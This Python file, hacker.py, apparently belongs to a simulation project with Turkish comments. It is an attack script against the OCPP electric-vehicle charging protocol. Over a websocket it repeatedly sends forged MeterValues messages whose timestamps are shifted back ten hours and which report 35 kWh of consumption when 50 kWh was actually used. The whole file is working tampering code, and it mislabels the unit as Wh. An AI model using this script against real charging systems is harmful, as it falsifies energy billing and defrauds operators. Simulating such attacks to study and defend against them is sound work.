# Dosya: Simulasyon/berat_time_desync/hacker.py
import asyncio
import logging
import json
from datetime import datetime, timezone, timedelta
import websockets

# --- SALDIRI PARAMETRELERİ ---
TIME_SHIFT_HOURS = 10
ACTUAL_CONSUMPTION_KWH = 50.0 
REPORTED_CONSUMPTION_KWH = 35.0 # Manipüle edilen değer

def timestamp_olustur(offset_hours=0):
    """Offset'li veya offsetsiz zaman damgası oluşturur."""
    dt = datetime.now(timezone.utc) - timedelta(hours=offset_hours)
    return dt.isoformat(timespec='seconds').replace('+00:00', 'Z')

def call_olustur(action, payload, mesaj_id):
    """OCPP Call (çağrı) mesajı dizisi oluşturur."""
    return json.dumps([2, mesaj_id, action, payload])

async def send_attack_data(websocket):
    """Manipüle edilmiş MeterValues'ları periyodik olarak gönderir (Saldırgan Görevi)."""
    mesaj_sayaci = 1
    while True:
        await asyncio.sleep(5) 
        
        # ZAMAN VE DEĞER MANİPÜLASYONU
        recorded_time_str = timestamp_olustur(TIME_SHIFT_HOURS)
        
        print(f"[HACKER] 💾 Kaydırılmış Zaman: {recorded_time_str.split('T')[1]}... ")
        print(f"[HACKER] ⚡ {ACTUAL_CONSUMPTION_KWH} yerine {REPORTED_CONSUMPTION_KWH} kWh raporlanıyor.")

        # MeterValues Call mesajı
        meter_mesaj = call_olustur('MeterValues', {
            "connectorId": 1,
            "meterValue": [{
                "timestamp": recorded_time_str,
                "sampledValue": [
                    {"value": str(REPORTED_CONSUMPTION_KWH), 
                     "context": "Sample.Periodic", 
                     "measurand": "Energy.Active.Import.Register", 
                     "unit": "Wh"}
                ]
            }]
        }, f"meter-{mesaj_sayaci}")

        await websocket.send(meter_mesaj)
        mesaj_sayaci += 1
